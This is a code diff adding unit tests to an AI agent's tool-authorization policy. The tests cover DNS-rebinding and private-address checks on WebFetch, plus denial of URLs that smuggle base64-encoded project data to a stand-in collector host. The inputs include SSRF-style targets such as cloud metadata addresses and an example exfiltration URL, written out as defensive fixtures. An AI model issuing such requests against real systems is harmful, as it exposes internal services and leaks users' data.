@@ -45,7 +45,8 @@ function shortPath(p: string): string {
 }
 
 function ctx(role: AgentRole, over: Partial<PolicyContext> = {}): PolicyContext {
-  return { role, worktreeRoot: wt, projectRoot: project, safeCommandPrefixes: [], allowNetworkTools: false, ...over }
+  // Names resolve to a public address here unless a test says otherwise: a unit test asks no real resolver.
+  return { role, worktreeRoot: wt, projectRoot: project, safeCommandPrefixes: [], allowNetworkTools: false, resolveHost: async () => ['93.184.216.34'], ...over }
 }
 async function run(role: AgentRole, toolName: string, input: Record<string, unknown>, over: Partial<PolicyContext> = {}): Promise<ToolDecision> {
   return createAuthorizer(ctx(role, over))({ agentId: 'a', toolName, input, toolUseId: 't' })
@@ -453,6 +454,39 @@ describe('never throws', () => {
     const authorize = createAuthorizer({ ...ctx('worker'), worktreeRoot: '\0bad', projectRoot: '\0bad' })
     const d = await authorize({ agentId: 'a', toolName: 'Write', input: { file_path: 'x.txt' }, toolUseId: 't' })
     expect(d.behavior).toBe('deny')
+  })
+})
+
+describe('WebFetch and what a name resolves to (0.9, review K-2)', () => {
+  const fetching = (url: string, addresses: string[] | Error) =>
+    behavior('researcher', 'WebFetch', { url }, { allowNetworkTools: true, resolveHost: async () => { if (addresses instanceof Error) throw addresses; return addresses } })
+
+  it('a public name that answers with a local or private address is a question, not a fetch', async () => {
+    expect(await fetching('http://localtest.me/', ['127.0.0.1'])).toBe('ask')
+    expect(await fetching('http://10.0.0.5.nip.io/', ['10.0.0.5'])).toBe('ask')
+    expect(await fetching('https://rebind.example.com/', ['93.184.216.34', '192.168.1.10'])).toBe('ask')
+    expect(await fetching('https://v6.example.com/', ['::1'])).toBe('ask')
+    expect(await fetching('https://meta.example.com/', ['169.254.169.254'])).toBe('ask')
+  })
+
+  it('a name that resolves to public addresses only is fetched; one that does not resolve is not', async () => {
+    expect(await fetching('https://example.com/docs', ['93.184.216.34', '2606:2800:220:1:248:1893:25c8:1946'])).toBe('allow')
+    expect(await fetching('https://nowhere.example.com/', [])).toBe('deny')
+    expect(await fetching('https://nowhere.example.com/', new Error('ENOTFOUND'))).toBe('deny')
+  })
+
+  it('a URL that is data is not fetched', async () => {
+    expect(await fetching(`https://collector.example.com/?d=${Buffer.from('what the session read in the project').toString('base64')}`, ['93.184.216.34'])).toBe('deny')
+    expect(await fetching(`https://collector.example.com/?d=${'w+'.repeat(300)}`, ['93.184.216.34'])).toBe('deny')
+  })
+
+  it('in an enrolled project the native web tools are refused whatever the setting: the research tools are the way', async () => {
+    const gate = { contained: true, confined: true, resolve: () => ({ behavior: 'allow' as const }) } as unknown as NonNullable<PolicyContext['autonomy']>
+    const enrolled = { allowNetworkTools: true, autonomy: gate }
+    const fetched = await run('researcher', 'WebFetch', { url: 'https://example.com/' }, enrolled)
+    expect(fetched.behavior).toBe('deny')
+    expect(fetched.behavior === 'deny' ? fetched.reason : '').toContain('research_read')
+    expect((await run('researcher', 'WebSearch', { query: 'vitest' }, enrolled)).behavior).toBe('deny')
   })
 })
 
